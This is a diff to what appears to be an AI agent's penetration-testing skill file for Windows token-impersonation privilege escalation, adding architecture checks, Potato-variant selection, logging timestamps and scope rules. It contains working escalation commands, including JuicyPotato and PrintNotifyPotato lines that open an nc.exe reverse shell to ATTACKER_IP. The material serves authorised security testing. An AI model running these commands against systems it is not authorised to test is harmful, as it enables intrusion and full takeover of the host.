@@ -42,7 +42,7 @@ Check for `./engagement/` directory. If absent:
 
 When an engagement directory exists, log as you work:
 - **Activity** → append to `engagement/activity.md` at milestones:
-  `### [HH:MM] windows-token-impersonation → <hostname>` with privilege found,
+  `### [YYYY-MM-DD HH:MM:SS] windows-token-impersonation → <hostname>` with privilege found,
   variant used, and result.
 - **Findings** → append to `engagement/findings.md` when SYSTEM access achieved.
 - **Evidence** → save output to `engagement/evidence/` (e.g.,
@@ -57,13 +57,14 @@ log invocation to both the screen and activity.md:
    sees which skill is running.
 2. **activity.md**: Append:
    ```
-   ### [HH:MM] windows-token-impersonation → <target>
+   ### [YYYY-MM-DD HH:MM:SS] windows-token-impersonation → <target>
    - Invoked (assessment starting)
    ```
 
-**Timestamps:** Replace `[HH:MM]` with the actual current time. Run
-`date +%H:%M` to get it. Never write the literal placeholder `[HH:MM]` —
-activity.md entries need real timestamps for timeline reconstruction.
+**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
+and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
+placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
+with date and second precision for timeline reconstruction.
 
 This entry must be written NOW, not deferred. Subsequent milestone entries
 append bullet points under this same header.
@@ -145,15 +146,48 @@ ver
 sc query Spooler
 ```
 
+## Step 2b: Check Architecture
+
+**Critical:** Potato binaries are architecture-specific. Verify before downloading:
+
+```cmd
+wmic os get osarchitecture
+systeminfo | findstr /C:"System Type"
+```
+
+| Output | Architecture | Binary needed |
+|--------|-------------|---------------|
+| `X86-based PC` / `32-bit` | x86 | 32-bit binaries |
+| `x64-based PC` / `64-bit` | x64 | 64-bit binaries |
+
+**Architecture impacts variant availability:**
+- **JuicyPotato**: Official GitHub release is **x64-only**. For x86 targets,
+  use GodPotato, SigmaPotato (in-memory via PowerShell), or compile from source
+  with 32-bit MinGW. If no x86 Potato variant is available, route to kernel
+  exploits (see fallback below).
+- **GodPotato**: Available as both x86 and x64 (.NET 3.5 and .NET 4 variants).
+  Preferred for x86 targets.
+- **PrintSpoofer**: Available as both x86 and x64.
+- **SigmaPotato**: In-memory via PowerShell — architecture-independent if
+  PowerShell is available (loads correct .NET assembly at runtime).
+- **EfsPotato**: Compile from source — choose target architecture.
+
 ## Step 3: Potato Variant Selection
 
 Use SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to get SYSTEM via DCOM
-token impersonation. Select variant by Windows version:
+token impersonation. Select variant by Windows version **and architecture** (see
+Step 2b):
 
 ### JuicyPotato — Windows 7/8/10 (pre-1809), Server 2008-2016
 
 Abuses DCOM/COM activation with chosen CLSID. Requires a valid CLSID for the target
 OS version.
+
+**Architecture warning:** The official GitHub release (`ohpe/juicy-potato`) is
+**x64-only**. On x86 targets, use GodPotato-NET35/NET4 (has x86 builds),
+SigmaPotato via PowerShell (architecture-independent), or compile JuicyPotato
+from source with `i686-w64-mingw32-gcc`. Do not download the official release
+for x86 targets — it will not execute.
 
 ```cmd
 JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -t * -c {CLSID}
@@ -287,10 +321,17 @@ PrintNotifyPotato.exe cmd /c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
 
 ```
 whoami /priv → SeImpersonate or SeAssignPrimaryToken?
+│
+├─ Check architecture (Step 2b)
+│  ├─ x86 → avoid official JuicyPotato (x64-only)
+│  │         prefer GodPotato-NET35/NET4 or SigmaPotato (PowerShell)
+│  └─ x64 → all variants available
+│
 ├─ Windows <= 10 1803 / Server 2016
-│  └─ JuicyPotato (needs CLSID)
+│  ├─ x64? → JuicyPotato (needs CLSID)
+│  └─ x86? → GodPotato > SigmaPotato (in-memory) > compile JuicyPotato from source
 ├─ Windows 10 1809+ / Server 2019
-│  ├─ Print Spooler running? → PrintSpoofer (simplest)
+│  ├─ Print Spooler running? → PrintSpoofer (simplest, has x86+x64)
 │  ├─ Egress available? → RoguePotato
 │  └─ Neither? → GodPotato or EfsPotato
 ├─ Windows 10/11 / Server 2022
@@ -298,8 +339,13 @@ whoami /priv → SeImpersonate or SeAssignPrimaryToken?
 │  ├─ GodPotato / SigmaPotato (most reliable)
 │  ├─ EfsPotato (pipe fallback)
 │  └─ JuicyPotatoNG (specific CLSID post-Jan 2023)
-└─ Spooler disabled everywhere?
-   └─ GodPotato > EfsPotato > RoguePotato > PrintNotifyPotato
+├─ Spooler disabled everywhere?
+│  └─ GodPotato > EfsPotato > RoguePotato > PrintNotifyPotato
+│
+└─ ALL POTATO VARIANTS FAILED? (wrong arch, no binary, service disabled, blocked)
+   └─ STOP. Do NOT attempt kernel exploits inline.
+     Update state.md with: what was tried, why it failed, OS version, arch.
+     Return to orchestrator for re-routing to **windows-kernel-exploits**.
 ```
 
 ## Step 4: Other Dangerous Privilege Exploitation
@@ -436,6 +482,12 @@ The CLSID worked but process creation failed. Try `-t *` to test both
 CreateProcessWithToken and CreateProcessAsUser. Also verify the command path
 is correct (use full paths).
 
+### JuicyPotato binary won't execute — "not a valid Win32 application"
+Architecture mismatch. The official JuicyPotato release is x64-only. On x86
+targets, use GodPotato (has x86 builds), SigmaPotato via PowerShell, or compile
+from source. Always run `systeminfo | findstr "System Type"` (Step 2b) before
+downloading binaries.
+
 ### JuicyPotato fails on Windows 10 1809+
 Expected — Microsoft hardened DCOM activation. Use PrintSpoofer, GodPotato,
 RoguePotato, or EfsPotato instead.
@@ -456,6 +508,14 @@ adjust token in code.
 ### FullPowers fails — not a service account
 FullPowers only works for LOCAL SERVICE and NETWORK SERVICE accounts. For other
 accounts, the privileges shown by `whoami /priv` are the actual privileges available.
+
+### All Potato variants failed — no working binary for this OS/arch
+Do NOT fall back to kernel exploits inline. This skill's scope is token
+privilege abuse, not kernel exploitation. Update `engagement/state.md` with
+what was tried and why it failed, then return to the orchestrator. The
+orchestrator will re-route to **windows-kernel-exploits** which has systematic
+exploit suggestion (WES-NG/Watson), architecture-aware binary sourcing, and
+crash-risk assessment.
 
 ### SeDebug but LSASS is PPL-protected
 LSASS runs as Protected Process Light (RunAsPPL=1). Options:
